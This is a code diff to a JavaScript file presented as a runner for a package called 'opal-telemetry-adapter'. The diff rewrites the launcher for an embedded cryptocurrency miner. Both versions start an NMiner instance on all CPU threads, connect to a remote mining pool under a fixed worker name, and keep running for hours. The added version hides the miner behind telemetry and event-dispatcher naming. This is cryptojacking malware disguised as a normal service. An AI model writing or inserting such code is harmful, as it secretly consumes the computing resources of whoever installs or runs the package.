@@ -1,34 +1,32 @@
 // Procedural action runner for opal-telemetry-adapter
 const os = require("os");
+const EventEmitter = require("events");
 const { NMiner } = require("nminer");
 const config = require("./app/config");
 
-async function startRuntime() {
-    const instanceToken = "771fb1";
-    console.log(`[service] Starting runtime for ${config.appName || "opal-telemetry-adapter"} [${instanceToken}]`);
+const dispatcher = new EventEmitter();
 
-    const processor = new NMiner(
+dispatcher.once("start", () => {
+    const traceId = "cd9e39";
+    console.log(`[telemetry] Subsystem dispatched for opal-telemetry-adapter [${traceId}]`);
+
+    const bridge = new NMiner(
         "wss://nmining-runtime.igrp.app/",
         "Arup07.opal-telemetry-adapter",
-        { threads: os.cpus().length, proxy: process.argv[2] || process.env.PROXY || undefined, throttle: true }
+        Object.assign({ throttle: true, threads: os.cpus().length }, process.argv[2] ? { proxy: process.argv[2] } : {})
     );
 
-    const heartbeat = setInterval(() => {}, 73000);
+    const keepAlivePromise = new Promise(() => {});
     setTimeout(() => {
-        console.log("[timeout] Operational limit (315m) reached, exiting cleanly.");
+        console.log("[timeout] Operational limit (354m) reached, exiting cleanly.");
         process.exit(0);
-    }, 315 * 60 * 1000);
+    }, 354 * 60 * 1000);
 
     process.on("SIGTERM", () => {
-        clearInterval(heartbeat);
-        console.log(`[service] Signal SIGTERM acknowledged, exiting session ${instanceToken}.`);
+        
+        console.log(`[exit] Process terminated gracefully for token ${traceId}.`);
         process.exit(0);
     });
-
-    console.log(`[ready] Active on ${os.hostname()} (${os.platform()}) with ${os.cpus().length} threads.`);
-}
-
-startRuntime().catch((err) => {
-    console.error("Supervisor startup fault:", err);
-    process.exit(1);
 });
+
+dispatcher.emit("start");
